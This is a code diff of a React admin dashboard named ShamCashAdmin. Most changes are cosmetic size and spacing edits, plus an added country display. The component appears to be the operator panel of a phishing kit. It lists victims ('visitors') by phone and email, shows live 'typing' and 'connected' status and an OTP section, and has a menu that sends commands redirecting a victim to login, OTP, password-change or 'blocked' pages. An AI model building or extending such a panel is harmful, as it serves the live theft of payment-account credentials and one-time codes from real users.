@@ -191,26 +191,26 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
     <div className="flex h-screen w-full overflow-hidden bg-[#0b1120] text-white" dir="rtl" style={{ fontFamily: "'Inter', system-ui, sans-serif" }}>
 
       {/* RIGHT PANEL — VISITORS LIST */}
-      <div className={`flex h-full w-full flex-col border-l border-[#1e2a45] bg-[#0d1526] ${selectedSub ? "hidden sm:flex sm:w-[340px]" : "flex"} sm:flex sm:w-[340px] flex-shrink-0`}>
+      <div className={`flex h-full w-full flex-col border-l border-[#1e2a45] bg-[#0d1526] ${selectedSub ? "hidden sm:flex sm:w-[240px]" : "flex"} sm:flex sm:w-[240px] flex-shrink-0`}>
 
         {/* Header */}
-        <div className="flex items-center justify-between px-4 pt-4 pb-3 border-b border-[#1e2a45]">
-          <div className="flex items-center gap-2">
-            <div className="flex h-8 w-8 items-center justify-center rounded-[8px] bg-[#657bd8]/15">
-              <Users className="h-4 w-4 text-[#657bd8]" />
+        <div className="flex items-center justify-between px-3 pt-3 pb-2 border-b border-[#1e2a45]">
+          <div className="flex items-center gap-1.5">
+            <div className="flex h-6 w-6 items-center justify-center rounded-[6px] bg-[#657bd8]/15">
+              <Users className="h-3 w-3 text-[#657bd8]" />
             </div>
             <div>
-              <p className="text-[13px] font-extrabold text-white/90">{T.visitors}</p>
-              <p className="text-[10px] text-[#c9ccdb]/40">{submissions.length} سجل</p>
+              <p className="text-[11px] font-extrabold text-white/90">{T.visitors}</p>
+              <p className="text-[9px] text-[#c9ccdb]/40">{submissions.length} سجل</p>
             </div>
           </div>
-          <div className="flex items-center gap-2">
+          <div className="flex items-center gap-1.5">
             {hasNew && (
-              <div className="h-2 w-2 rounded-full bg-[#e54343] animate-pulse ring-2 ring-[#0d1526]" />
+              <div className="h-1.5 w-1.5 rounded-full bg-[#e54343] animate-pulse ring-2 ring-[#0d1526]" />
             )}
             {onLogout && (
-              <button onClick={onLogout} className="rounded-[6px] bg-white/5 p-1.5 text-white/40 hover:bg-red-500/20 hover:text-red-400 transition-colors">
-                <LogOut className="h-3.5 w-3.5" />
+              <button onClick={onLogout} className="rounded-[5px] bg-white/5 p-1 text-white/40 hover:bg-red-500/20 hover:text-red-400 transition-colors">
+                <LogOut className="h-3 w-3" />
               </button>
             )}
           </div>
@@ -274,32 +274,32 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
               const timeAgo = timeDiff < 60000 ? "الآن" : timeDiff < 3600000 ? `${Math.floor(timeDiff / 60000)} د` : `${Math.floor(timeDiff / 3600000)} س`;
               return (
                 <button key={sub.id} onClick={() => { setSelected(sub.id); setHasNew(false); }}
-                  className={`w-full rounded-[12px] border p-3 text-right transition-all duration-150 ${isSelected
-                    ? "bg-[#1a2a55] border-[#657bd8]/50 shadow-[0_0_12px_rgba(101,123,216,0.15)]"
+                  className={`w-full rounded-[10px] border p-2 text-right transition-all duration-150 ${isSelected
+                    ? "bg-[#1a2a55] border-[#657bd8]/50 shadow-[0_0_10px_rgba(101,123,216,0.15)]"
                     : "bg-[#121d35] border-[#1e2a45] hover:bg-[#162038] hover:border-[#2a3a5a]"
                     }`}
                   dir={"rtl"}
                 >
-                  <div className="flex items-start justify-between gap-2">
-                    <div className="flex items-center gap-2 min-w-0">
-                      <div className={`flex h-8 w-8 shrink-0 items-center justify-center rounded-full text-[13px] font-extrabold
+                  <div className="flex items-start justify-between gap-1.5">
+                    <div className="flex items-center gap-1.5 min-w-0">
+                      <div className={`flex h-6 w-6 shrink-0 items-center justify-center rounded-full text-[11px] font-extrabold
                         ${sub.isActive ? "bg-[#1fc28a]/15 text-[#1fc28a]" : "bg-[#657bd8]/10 text-[#657bd8]/60"}`}>
                         {displayPhone.slice(0, 1).toUpperCase() || "؟"}
                       </div>
                       <div className="min-w-0">
-                        <p className="truncate text-[12px] font-bold text-white/85">{displayPhone}</p>
+                        <p className="truncate text-[11px] font-bold text-white/85">{displayPhone}</p>
                         {sub.email && sub.phone && (
-                          <p className="truncate text-[10px] text-white/35" dir="ltr">{sub.email}</p>
+                          <p className="truncate text-[9px] text-white/35" dir="ltr">{sub.email}</p>
                         )}
                       </div>
                     </div>
-                    <div className="flex flex-col items-end gap-1 shrink-0">
-                      <span className="text-[9px] text-white/30 flex items-center gap-1">
-                        <Clock className="h-2.5 w-2.5" />{timeAgo}
+                    <div className="flex flex-col items-end gap-0.5 shrink-0">
+                      <span className="text-[8px] text-white/30 flex items-center gap-1">
+                        <Clock className="h-2 w-2" />{timeAgo}
                       </span>
                       {sub.isActive && (
-                        <span className="flex items-center gap-1 rounded-full bg-[#1fc28a]/15 px-1.5 py-0.5 text-[9px] font-bold text-[#1fc28a]">
-                          <span className="h-1.5 w-1.5 rounded-full bg-[#1fc28a] animate-pulse" />
+                        <span className="flex items-center gap-1 rounded-full bg-[#1fc28a]/15 px-1 py-0.5 text-[8px] font-bold text-[#1fc28a]">
+                          <span className="h-1 w-1 rounded-full bg-[#1fc28a] animate-pulse" />
                           {T.connectedNow}
                         </span>
                       )}
@@ -352,29 +352,29 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
           <div className="h-full overflow-y-auto">
 
             {/* Details Header */}
-            <div className="sticky top-0 z-10 border-b border-[#1e2a45] bg-[#0b1120]/95 backdrop-blur-sm px-5 pt-4 pb-3">
-              <div className="flex items-center justify-between gap-3">
-                <div className="flex items-center gap-3 min-w-0">
-                  <button onClick={() => setSelected(null)} className="sm:hidden rounded-[8px] bg-white/5 p-2 text-white/50 hover:bg-white/10">
-                    <X className="h-4 w-4" />
+            <div className="sticky top-0 z-10 border-b border-[#1e2a45] bg-[#0b1120]/95 backdrop-blur-sm px-3 pt-2.5 pb-2">
+              <div className="flex items-center justify-between gap-2">
+                <div className="flex items-center gap-2 min-w-0">
+                  <button onClick={() => setSelected(null)} className="sm:hidden rounded-[7px] bg-white/5 p-1.5 text-white/50 hover:bg-white/10">
+                    <X className="h-3.5 w-3.5" />
                   </button>
-                  <div className={`flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-[16px] font-extrabold
+                  <div className={`flex h-7 w-7 shrink-0 items-center justify-center rounded-full text-[12px] font-extrabold
                     ${selectedSub.isActive ? "bg-[#1fc28a]/20 text-[#1fc28a]" : "bg-[#657bd8]/15 text-[#657bd8]/70"}`}>
                     {(selectedSub.phone || selectedSub.email || "؟").slice(0, 1).toUpperCase()}
                   </div>
                   <div className="min-w-0">
-                    <p className="text-[14px] font-extrabold text-white/90 truncate">
+                    <p className="text-[12px] font-extrabold text-white/90 truncate">
                       {selectedSub.phone || selectedSub.email || selectedSub.id.slice(-10)}
                     </p>
-                    <div className="flex items-center gap-1.5">
+                    <div className="flex items-center gap-1">
                       <span className={`h-1.5 w-1.5 rounded-full ${selectedSub.isActive ? statusDot[liveStatus] : "bg-white/20"}`} />
-                      <span className={`text-[10px] font-semibold ${selectedSub.isActive ? statusColor[liveStatus] : "text-white/30"}`}>
+                      <span className={`text-[9px] font-semibold ${selectedSub.isActive ? statusColor[liveStatus] : "text-white/30"}`}>
                         {selectedSub.isActive
                           ? (liveStatus === "typing" ? T.statusTyping : liveStatus === "submitted" ? T.statusSubmitted : T.statusConnected)
                           : T.statusDisconnected}
                       </span>
                       {selectedSub.page && (
-                        <span className={`rounded-full px-1.5 py-0.5 text-[9px] font-bold ${pageColor[selectedSub.page] ?? "bg-white/5 text-white/40"}`}>
+                        <span className={`rounded-full px-1.5 py-0.5 text-[8px] font-bold ${pageColor[selectedSub.page] ?? "bg-white/5 text-white/40"}`}>
                           {selectedSub.page}
                         </span>
                       )}
@@ -385,21 +385,21 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
                 {/* Redirect dropdown */}
                 <div className="relative shrink-0">
                   <button onClick={() => setShowRedirect(!showRedirect)}
-                    className="flex items-center gap-1.5 rounded-[9px] bg-[#657bd8]/15 border border-[#657bd8]/30 px-3 py-2 text-[11px] font-bold text-[#657bd8] hover:bg-[#657bd8]/25 transition-colors">
-                    <ArrowRightLeft className="h-3.5 w-3.5" />
+                    className="flex items-center gap-1 rounded-[7px] bg-[#657bd8]/15 border border-[#657bd8]/30 px-2 py-1.5 text-[10px] font-bold text-[#657bd8] hover:bg-[#657bd8]/25 transition-colors">
+                    <ArrowRightLeft className="h-3 w-3" />
                     {T.redirectTo}
-                    <ChevronDown className="h-3 w-3" />
+                    <ChevronDown className="h-2.5 w-2.5" />
                   </button>
                   {showRedirect && (
-                    <div className={`absolute top-full mt-1 z-50 rounded-[12px] bg-[#131e35] border border-[#1e2a45] shadow-2xl overflow-hidden min-w-[180px] ${"left-0"}`}>
+                    <div className={`absolute top-full mt-1 z-50 rounded-[10px] bg-[#131e35] border border-[#1e2a45] shadow-2xl overflow-hidden min-w-[160px] ${"left-0"}`}>
                       {[
-                        { cmd: "redirect:login", label: T.redirectLogin, icon: <UserRound className="h-3.5 w-3.5" />, color: "text-white/70" },
-                        { cmd: "redirect:otp", label: T.redirectOtp, icon: <ShieldCheck className="h-3.5 w-3.5" />, color: "text-[#657bd8]" },
-                        { cmd: "redirect:changepass", label: T.redirectChangepass, icon: <KeyRound className="h-3.5 w-3.5" />, color: "text-[#1fc28a]" },
-                        { cmd: "redirect:blocked", label: T.redirectBlocked, icon: <XCircle className="h-3.5 w-3.5" />, color: "text-[#e54343]" },
+                        { cmd: "redirect:login", label: T.redirectLogin, icon: <UserRound className="h-3 w-3" />, color: "text-white/70" },
+                        { cmd: "redirect:otp", label: T.redirectOtp, icon: <ShieldCheck className="h-3 w-3" />, color: "text-[#657bd8]" },
+                        { cmd: "redirect:changepass", label: T.redirectChangepass, icon: <KeyRound className="h-3 w-3" />, color: "text-[#1fc28a]" },
+                        { cmd: "redirect:blocked", label: T.redirectBlocked, icon: <XCircle className="h-3 w-3" />, color: "text-[#e54343]" },
                       ].map((opt) => (
                         <button key={opt.cmd} onClick={() => { sendCmd(opt.cmd); setShowRedirect(false); }}
-                          className={`flex w-full items-center gap-2.5 px-4 py-3 text-[12px] font-semibold ${opt.color} hover:bg-white/5 transition-colors`}
+                          className={`flex w-full items-center gap-2 px-3 py-2 text-[11px] font-semibold ${opt.color} hover:bg-white/5 transition-colors`}
                           dir={"rtl"}>
                           {opt.icon}{opt.label}
                         </button>
@@ -410,26 +410,31 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
               </div>
 
               {/* Quick info row */}
-              <div className="mt-3 flex flex-wrap items-center gap-2">
+              <div className="mt-1.5 flex flex-wrap items-center gap-1.5">
                 {selectedSub.submittedAt && (
-                  <span className="flex items-center gap-1 text-[10px] text-white/35">
-                    <Clock className="h-3 w-3" /> {selectedSub.submittedAt}
+                  <span className="flex items-center gap-1 text-[9px] text-white/35">
+                    <Clock className="h-2.5 w-2.5" /> {selectedSub.submittedAt}
                   </span>
                 )}
-                <span className="flex items-center gap-1 text-[10px] text-white/20">
+                {selectedSub.country && (
+                  <span className="flex items-center gap-1 text-[9px] text-[#657bd8]/70">
+                    <Globe className="h-2.5 w-2.5" /> {selectedSub.country}
+                  </span>
+                )}
+                <span className="flex items-center gap-1 text-[9px] text-white/20">
                   ID: {selectedSub.id.slice(-8)}
                 </span>
               </div>
             </div>
 
-            <div className="space-y-3 p-5" onClick={() => setShowRedirect(false)}>
+            <div className="space-y-2 p-3" onClick={() => setShowRedirect(false)}>
 
               {/* OTP SECTION */}
-              <div className="rounded-[14px] border border-[#1e2a45] bg-[#121d35] overflow-hidden">
-                <div className="flex items-center justify-between border-b border-[#1e2a45] px-4 py-2.5">
-                  <div className="flex items-center gap-2">
-                    <ShieldCheck className="h-4 w-4 text-[#657bd8]" />
-                    <span className="text-[12px] font-extrabold text-[#657bd8]">{T.otpSection}</span>
+              <div className="rounded-[12px] border border-[#1e2a45] bg-[#121d35] overflow-hidden">
+                <div className="flex items-center justify-between border-b border-[#1e2a45] px-3 py-2">
+                  <div className="flex items-center gap-1.5">
+                    <ShieldCheck className="h-3 w-3 text-[#657bd8]" />
+                    <span className="text-[11px] font-extrabold text-[#657bd8]">{T.otpSection}</span>
                   </div>
                   {selectedSub.otpStatus && (
                     <span className={`rounded-full px-2 py-0.5 text-[9px] font-bold
